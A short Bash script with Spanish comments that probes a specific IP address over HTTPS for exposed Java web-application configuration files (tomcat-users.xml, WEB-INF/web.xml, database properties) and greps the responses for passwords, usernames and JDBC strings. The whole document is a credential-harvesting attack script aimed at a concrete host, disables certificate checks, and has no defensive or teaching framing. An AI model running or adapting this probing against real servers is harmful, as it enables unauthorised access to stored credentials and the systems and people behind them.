# Buscar archivos de configuración en rutas alternativas
echo "=== BUSQUEDA DE ARCHIVOS DE CONFIGURACIÓN ==="

config_paths=(
    "/conf/tomcat-users.xml"
    "/WEB-INF/web.xml" 
    "/WEB-INF/classes/application.properties"
    "/WEB-INF/classes/database.properties"
    "/META-INF/context.xml"
    "/config/database.conf"
    "/properties/config.properties"
)

for path in "${config_paths[@]}"; do
    echo "Probando: $path"
    curl -k -s "https://189.254.143.102$path" | \
    grep -i "password\|username\|jdbc" | \
    head -2
done
